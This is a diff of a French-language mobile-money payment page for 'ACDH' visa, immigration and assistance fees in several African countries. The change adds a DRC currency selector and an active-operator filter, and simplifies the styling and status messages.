@@ -6,13 +6,12 @@
 
 <style>
 body {
-  font-family: Arial, sans-serif;
+  font-family: Arial;
   background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
   display: flex;
   justify-content: center;
   align-items: center;
   height: 100vh;
-  color: #333;
 }
 
 .box {
@@ -21,25 +20,12 @@ body {
   border-radius: 12px;
   width: 360px;
   text-align: center;
-  box-shadow: 0 0 15px rgba(0,0,0,0.2);
-}
-
-.logo {
-  width: 90px;
-  margin-bottom: 10px;
-}
-
-h2 {
-  font-size: 18px;
-  margin-bottom: 15px;
 }
 
 input, select {
   width: 100%;
   padding: 10px;
   margin-top: 10px;
-  border-radius: 6px;
-  border: 1px solid #ccc;
 }
 
 button {
@@ -49,24 +35,12 @@ button {
   background: #00bcd4;
   color: white;
   border: none;
-  border-radius: 6px;
-  font-weight: bold;
-  cursor: pointer;
-}
-
-button:hover {
-  background: #0097a7;
-}
-
-#result {
-  margin-top: 15px;
   font-weight: bold;
 }
 
 #displayAmount {
   margin-top: 10px;
-  font-size: 14px;
-  color: #444;
+  font-weight: bold;
 }
 </style>
 </head>
@@ -75,9 +49,7 @@ button:hover {
 
 <div class="box">
 
-<img src="logo.png" class="logo">
-
-<h2>PAIEMENT DES FRAIS ACDH</h2>
+<h2>PAIEMENT ACDH</h2>
 
 <select id="service" onchange="updateAmount()">
   <option value="visa">Visa Canada</option>
@@ -85,7 +57,7 @@ button:hover {
   <option value="assistance">Assistance</option>
 </select>
 
-<select id="country" onchange="updateOperators(); updateAmount()">
+<select id="country" onchange="updateOperators(); updateAmount(); toggleCurrency()">
   <option value="CIV">Côte d'Ivoire</option>
   <option value="CMR">Cameroun</option>
   <option value="COD">RDC</option>
@@ -95,9 +67,14 @@ button:hover {
   <option value="BEN">Bénin</option>
 </select>
 
+<select id="currency" style="display:none" onchange="updateAmount()">
+  <option value="CDF">CDF</option>
+  <option value="USD">USD</option>
+</select>
+
 <select id="operator"></select>
 
-<input type="text" id="phone" placeholder="Numéro de téléphone">
+<input type="text" id="phone" placeholder="Numéro">
 
 <input type="hidden" id="amount">
 <p id="displayAmount"></p>
@@ -110,14 +87,14 @@ button:hover {
 
 <script>
 
-// SERVICES (USD)
+// 💳 SERVICES (USD)
 const services = {
   visa: 10,
   immigration: 20,
   assistance: 5
 };
 
-// MONNAIES
+// 🌍 DEVISES
 const currencies = {
   BEN: "XOF",
   CIV: "XOF",
@@ -125,21 +102,32 @@ const currencies = {
   CMR: "XAF",
   GAB: "XAF",
   COG: "XAF",
-  COD: "CDF"
+  COD: null
 };
 
-// OPERATEURS
+// 📡 OPERATEURS (dashboard réel)
 const operators = {
   BEN: ["MTN", "MOOV"],
-  CIV: ["MTN", "ORANGE"],
   CMR: ["MTN"],
+  CIV: ["MTN", "ORANGE"],
   COD: ["AIRTEL", "ORANGE", "VODACOM"],
-  COG: ["AIRTEL", "MTN"],
   GAB: ["AIRTEL"],
+  COG: ["AIRTEL", "MTN"],
   SEN: ["ORANGE", "FREE"]
 };
 
-// PREFIXES
+// 🔓 OPERATEURS ACTIFS
+const activeProviders = {
+  BEN: ["MTN", "MOOV"],
+  CMR: ["MTN"],
+  CIV: ["MTN", "ORANGE"],
+  COD: ["AIRTEL", "ORANGE", "VODACOM"],
+  GAB: ["AIRTEL"],
+  COG: ["AIRTEL", "MTN"],
+  SEN: ["ORANGE"]
+};
+
+// 📞 PREFIXES
 const prefixes = {
   BEN: "229",
   CIV: "225",
@@ -152,18 +140,18 @@ const prefixes = {
 
 let exchangeRates = {};
 
-// CHARGER TAUX
+// 💱 API TAUX
 async function loadRates() {
   try {
     const res = await fetch("https://open.er-api.com/v6/latest/USD");
     const data = await res.json();
     exchangeRates = data.rates;
-  } catch (e) {
+  } catch {
     console.log("Erreur taux");
   }
 }
 
-// OPERATEURS
+// 🔄 OPERATEURS
 function updateOperators() {
   const country = document.getElementById("country").value;
   const select = document.getElementById("operator");
@@ -172,16 +160,18 @@ function updateOperators() {
   select.innerHTML = "";
 
   operators[country].forEach(op => {
-    const option = document.createElement("option");
-    option.value = op;
-    option.textContent = op;
-    select.appendChild(option);
+    if (activeProviders[country].includes(op)) {
+      const option = document.createElement("option");
+      option.value = op;
+      option.textContent = op;
+      select.appendChild(option);
+    }
   });
 
   phone.value = prefixes[country];
 }
 
-// BLOQUER PREFIXE
+// 🔒 PREFIXE
 document.getElementById("phone").addEventListener("input", function () {
   const country = document.getElementById("country").value;
   const prefix = prefixes[country];
@@ -191,13 +181,24 @@ document.getElementById("phone").addEventListener("input", function () {
   }
 });
 
-// CONVERSION
+// 🌍 RDC devise
+function toggleCurrency() {
+  const country = document.getElementById("country").value;
+  const currencySelect = document.getElementById("currency");
+
+  currencySelect.style.display = country === "COD" ? "block" : "none";
+}
+
+// 💱 CONVERSION
 function updateAmount() {
   const service = document.getElementById("service").value;
   const country = document.getElementById("country").value;
 
   const usd = services[service];
-  const currency = currencies[country];
+
+  const currency = country === "COD"
+    ? document.getElementById("currency").value
+    : currencies[country];
 
   if (!exchangeRates[currency]) return;
 
@@ -209,24 +210,23 @@ function updateAmount() {
     "Montant à payer : " + converted + " " + currency;
 }
 
-// PAIEMENT
+// 💳 PAIEMENT
 async function payer() {
 
-  const phone = document.getElementById("phone").value.trim();
+  const phone = document.getElementById("phone").value;
   const amount = document.getElementById("amount").value;
   const country = document.getElementById("country").value;
   const operator = document.getElementById("operator").value;
   const result = document.getElementById("result");
 
   if (!phone || phone.length < 8) {
-    result.innerText = "⚠️ Numéro invalide";
+    result.innerText = "Numéro invalide";
     return;
   }
 
-  result.innerText = "⏳ Traitement...";
+  result.innerText = "Traitement...";
 
   try {
-
     const res = await fetch("https://orange-queen.serviceprive93.workers.dev/deposit", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -235,29 +235,21 @@ async function payer() {
 
     const data = await res.json();
 
-    switch (data.status) {
-      case "ACCEPTED":
-        result.innerText = "📲 Vérifiez votre téléphone";
-        break;
-      case "PENDING":
-        result.innerText = "⏳ En attente...";
-        break;
-      case "SUCCESS":
-        result.innerText = "✅ Paiement réussi";
-        break;
-      default:
-        result.innerText = "❌ Échec du paiement";
-    }
+    result.innerText =
+      data.status === "SUCCESS" ? "Paiement réussi"
+      : data.status === "PENDING" ? "En attente"
+      : "Échec";
 
-  } catch (err) {
-    result.innerText = "❌ Erreur réseau";
+  } catch {
+    result.innerText = "Erreur réseau";
   }
 }
 
-// INIT
+// 🚀 INIT
 loadRates().then(() => {
   updateOperators();
   updateAmount();
+  toggleCurrency();
 });
 
 </script>
